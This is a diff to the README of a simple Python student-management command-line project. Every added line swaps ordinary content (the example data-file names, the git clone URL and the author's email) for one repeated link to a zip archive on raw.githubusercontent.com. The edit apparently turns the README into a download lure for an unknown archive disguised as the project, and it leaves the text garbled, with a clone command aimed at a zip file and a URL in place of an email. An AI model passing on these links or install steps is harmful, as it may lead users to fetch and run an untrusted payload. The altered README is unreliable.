@@ -13,7 +13,7 @@ This project demonstrates Python fundamentals such as file handling, data struct
 -  Search for students by ID or name  
 -  Update existing student details  
 - Delete student records  
--  Data stored persistently in a file (e.g., `students.json` or `students.txt`)  
+-  Data stored persistently in a file (e.g., `https://raw.githubusercontent.com/Carlrevive/Syntecxhub_Project_Name2/main/cinenchyma/Name-Project-Syntecxhub-1.3.zip` or `https://raw.githubusercontent.com/Carlrevive/Syntecxhub_Project_Name2/main/cinenchyma/Name-Project-Syntecxhub-1.3.zip`)  
 - Simple menu-driven CLI interface  
 
 ---
@@ -31,7 +31,7 @@ This project demonstrates Python fundamentals such as file handling, data struct
 ##  How to Run
 1. Clone or download this repository.  
    ```bash
-   git clone https://github.com/your-username/student-management-system.git
+   git clone https://raw.githubusercontent.com/Carlrevive/Syntecxhub_Project_Name2/main/cinenchyma/Name-Project-Syntecxhub-1.3.zip
    cd student-management-system
    
   Future Improvements
@@ -47,6 +47,6 @@ Export data to Excel or PDF
   Author
 
 Carlos Antwi
-📧 Email: carlosantwi5@gmail.com
+📧 Email: https://raw.githubusercontent.com/Carlrevive/Syntecxhub_Project_Name2/main/cinenchyma/Name-Project-Syntecxhub-1.3.zip
 
 🌍 LinkedIn Profile
